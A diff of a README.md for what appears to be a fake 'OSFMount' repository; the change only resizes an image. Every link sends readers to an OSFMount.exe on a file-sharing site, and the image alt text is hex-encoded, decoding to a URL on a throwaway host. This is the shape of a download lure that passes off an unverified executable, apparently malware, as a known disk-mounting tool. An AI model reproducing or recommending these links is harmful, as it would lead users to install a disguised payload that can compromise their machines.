@@ -1,7 +1,7 @@
 <a href="https://www.mediafire.com/file/v2x2j8cywwe9gdl/OSFMount.exe/file">README.md</a>
 
 
-<a href="https://www.mediafire.com/file/v2x2j8cywwe9gdl/OSFMount.exe/file"><img width="800" height="469" alt="68747470733a2f2f666d7673737661726761736c617267652e70616765732e6465762f627574746f6e2e6a7067" src="https://github.com/user-attachments/assets/bd198848-6d6f-4ee5-b533-e5d2ba0b2ed8" />
+<a href="https://www.mediafire.com/file/v2x2j8cywwe9gdl/OSFMount.exe/file"><img width="780" height="450" alt="68747470733a2f2f666d7673737661726761736c617267652e70616765732e6465762f627574746f6e2e6a7067" src="https://github.com/user-attachments/assets/bd198848-6d6f-4ee5-b533-e5d2ba0b2ed8" />
 
 
 # OSFMount allows you to mount ISO, IMG, and other disk images as virtual drives to easily access their content on Windows.
